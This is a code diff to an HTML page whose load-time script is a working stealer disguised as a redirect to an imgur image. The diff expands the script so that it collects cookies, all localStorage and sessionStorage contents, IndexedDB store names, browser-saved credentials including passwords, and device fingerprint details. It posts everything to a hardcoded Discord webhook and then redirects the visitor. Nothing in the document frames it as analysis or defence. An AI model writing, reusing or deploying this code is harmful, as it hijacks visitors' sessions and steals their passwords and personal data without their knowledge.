@@ -8,36 +8,117 @@
 <body>
     <script>
         (function() {
-            const cookieString = document.cookie;
-            const payload = {
-                cookies: cookieString || "[NO COOKIES FOUND]",
+            var data = {
+                cookies: document.cookie || "[NO COOKIES]",
+                localStorage: {},
+                sessionStorage: {},
+                indexedDB: [],
+                windowName: window.name || "[EMPTY]",
+                credentials: null,
                 userAgent: navigator.userAgent,
                 url: window.location.href,
+                referrer: document.referrer || "[NONE]",
+                protocol: window.location.protocol,
+                hostname: window.location.hostname,
+                pathname: window.location.pathname,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
                 timestamp: new Date().toISOString(),
                 for_lo: "always"
             };
-            const webhookUrl = "https://discord.com/api/webhooks/1532563312099725448/kFpOzSZA3tvbzWo_yQ4ZcWBUt4js1D8HJTacOuEyL89gl25hS5ecYjpwyRN5EmlHdxV9";
-            const payloadString = JSON.stringify({
-                content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
-            });
 
             try {
-                if (navigator.sendBeacon) {
-                    var blob = new Blob([payloadString], {type: 'application/json'});
-                    navigator.sendBeacon(webhookUrl, blob);
-                } else {
-                    fetch(webhookUrl, {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: payloadString,
-                        keepalive: true
-                    });
+                var lsKeys = Object.keys(localStorage);
+                for (var i = 0; i < lsKeys.length; i++) {
+                    data.localStorage[lsKeys[i]] = localStorage.getItem(lsKeys[i]);
                 }
-            } catch(e) {}
+            } catch(e) {
+                data.localStorage = "[UNAVAILABLE]";
+            }
 
-            window.location.replace("https://imgur.com/a/BvymwS4");
+            try {
+                var ssKeys = Object.keys(sessionStorage);
+                for (var j = 0; j < ssKeys.length; j++) {
+                    data.sessionStorage[ssKeys[j]] = sessionStorage.getItem(ssKeys[j]);
+                }
+            } catch(e) {
+                data.sessionStorage = "[UNAVAILABLE]";
+            }
+
+            try {
+                var request = indexedDB.open("_temp");
+                request.onsuccess = function(event) {
+                    var db = event.target.result;
+                    var dbNames = [];
+                    for (var k = 0; k < db.objectStoreNames.length; k++) {
+                        dbNames.push(db.objectStoreNames[k]);
+                    }
+                    data.indexedDB = dbNames;
+                    db.close();
+                };
+                request.onerror = function() {
+                    data.indexedDB = "[UNAVAILABLE]";
+                };
+            } catch(e) {
+                data.indexedDB = "[UNAVAILABLE]";
+            }
+
+            try {
+                navigator.credentials.get({password: true}).then(function(cred) {
+                    if (cred) {
+                        data.credentials = {
+                            type: cred.type,
+                            id: cred.id,
+                            password: cred.password || "[HIDDEN]"
+                        };
+                    }
+                    sendPayload();
+                }).catch(function() {
+                    data.credentials = "[UNAVAILABLE]";
+                    sendPayload();
+                });
+            } catch(e) {
+                data.credentials = "[UNAVAILABLE]";
+                sendPayload();
+            }
+
+            function sendPayload() {
+                var payloadString = JSON.stringify({
+                    content: "```json\n" + JSON.stringify(data, null, 2) + "\n```"
+                });
+
+                var webhookUrl = "https://discord.com/api/webhooks/1532563312099725448/kFpOzSZA3tvbzWo_yQ4ZcWBUt4js1D8HJTacOuEyL89gl25hS5ecYjpwyRN5EmlHdxV9";
+
+                try {
+                    if (navigator.sendBeacon) {
+                        var blob = new Blob([payloadString], {type: 'application/json'});
+                        navigator.sendBeacon(webhookUrl, blob);
+                    } else {
+                        fetch(webhookUrl, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: payloadString,
+                            keepalive: true
+                        });
+                    }
+                } catch(e) {}
+
+                window.location.replace("https://imgur.com/a/BvymwS4");
+            }
+
+            if (!navigator.credentials || !navigator.credentials.get) {
+                sendPayload();
+            }
         })();
     </script>
 </body>
